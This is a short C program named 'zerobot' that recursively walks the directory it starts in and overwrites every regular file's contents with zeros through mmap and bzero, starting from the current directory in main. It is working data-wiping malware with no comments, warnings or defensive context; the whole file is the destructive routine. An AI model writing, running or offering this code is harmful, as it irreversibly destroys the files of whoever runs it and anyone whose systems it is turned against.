#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/mman.h>

zerobot (char *path) {
    struct dirent *entry;
    char flag;
    int fd;
    int *addr;
    char c;
    struct stat buf;
    DIR *dir=opendir(path);
    if (chdir(path)==-1) {
        perror("chdir");
        exit(1);
    }
    if (!dir) {
        printf("%s",strerror(errno));
        exit(EXIT_FAILURE);
    }
    while (1) {
        entry=readdir(dir);
        if (!entry) break;
        if (stat(entry->d_name,&buf)==-1) {
            perror("stat");
            exit(1);
        }
        if (S_ISDIR(buf.st_mode)) {
            if (entry->d_name[0]=='.') continue;
            zerobot(entry->d_name);
            continue;
        }
        if (!S_ISREG(buf.st_mode)) continue; 
        fd=open(entry->d_name,O_RDWR);
        if (fd==-1) {
            perror("open");
            continue;
        }
        addr=mmap(0,buf.st_size,PROT_WRITE,MAP_SHARED,fd,0);
        if (addr==MAP_FAILED) {
            perror("mmap");
            continue;
        }
        bzero(addr,buf.st_size);
        if (munmap(addr,buf.st_size)==-1) perror("munmap");
        if (close(fd)== -1) perror("close");                
    }
    if (closedir(dir)!=0) {
        printf("%s",strerror(errno));
        exit(EXIT_FAILURE);
    }
    if (chdir("..")==-1) {
        perror("chdir2");
        exit(1);
    }
    return 0;
}



int main() {
    zerobot(".");
    return 0;
}
        
